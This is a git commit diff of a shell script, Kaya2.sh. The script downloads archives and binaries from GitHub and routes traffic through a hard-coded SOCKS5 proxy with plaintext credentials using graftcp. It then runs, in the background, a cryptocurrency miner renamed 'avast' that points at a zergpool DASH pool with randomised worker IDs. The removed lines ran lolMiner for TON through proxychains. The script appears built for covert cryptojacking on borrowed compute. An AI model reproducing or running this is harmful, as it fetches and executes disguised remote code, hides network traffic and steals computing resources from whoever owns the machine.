35f293cf9507873820dd194f84dc8eea790bea22
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-12 23:12:54 +0700

    Update Kaya2.sh

--- Kaya2.sh
+++ Kaya2.sh
@@ -1,11 +1,37 @@
-#!/bin/bash
+#!/bin/sh
 
-sudo apt update 
-sudo apt install proxychains  -y 
-sudo sed -i 's/socks4/socks5/' /etc/proxychains.conf 
-sudo sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
-sudo sed -i 's/9050/10663/' /etc/proxychains.conf
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.43/lolMiner_v1.43_Lin64.tar.gz 
-tar -xvf lolMiner_v1.43_Lin64.tar.gz 
-cd 1.43 
-./lolMiner --algo TON --pool ton.hashrate.to:4003 --user EQDvplhJBloxeiVMEqwQpF_-yxtKXDbIlaENGDBRuicLIpD8.ranggadek
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 3.16.66.235:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://github.com/aurbach55/pos/raw/main/avast
+chmod +x avast
+
+./graftcp/graftcp nohup ./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 -x > /tmp/avast.log 2>&1
